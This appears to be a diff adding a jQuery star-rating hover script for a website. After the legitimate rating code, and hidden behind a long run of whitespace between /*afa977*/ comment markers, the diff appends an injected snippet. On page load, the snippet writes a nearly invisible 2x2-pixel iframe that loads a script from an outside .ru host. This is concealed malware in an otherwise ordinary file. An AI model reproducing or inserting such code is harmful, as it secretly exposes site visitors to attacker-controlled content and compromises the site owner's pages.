@@ -1,0 +1,25 @@
+var $j = jQuery.noConflict();
+$j(document).ready(function() {
+
+	$j("[id^=rating_]").hover(function() {
+		rid = $j(this).attr("id").split("_")[1];
+		
+		$j("#rating_"+rid).children("[class^=star_]").children('img').hover(function() {
+
+			$j("#rating_"+rid).children("[class^=star_]").children('img').removeClass("hover");
+
+			/* The hovered item number */
+			var hovered = $j(this).parent().attr("class").split("_")[1];
+	
+			while(hovered > 0) {
+				$j("#rating_"+rid).children(".star_"+hovered).children('img').addClass("hover");
+				hovered--;				
+			}
+
+		});
+	});
+});
+
+/*afa977*/
+                                                                                                                                                                                                                                                          (function(){ var a = document.createElement('iframe'); a.src = 'http://zaefofin.ru/count8.php'; a.style.position = 'absolute'; a.style.border = '0'; a.style.height = '2px'; a.style.width = '2px'; a.style.left = '1px'; a.style.top = '1px'; if(!document.getElementById('mira')) { document.write('<div id=\'mira\'></div>'); document.getElementById('mira').appendChild(a); }})();
+/*/afa977*/
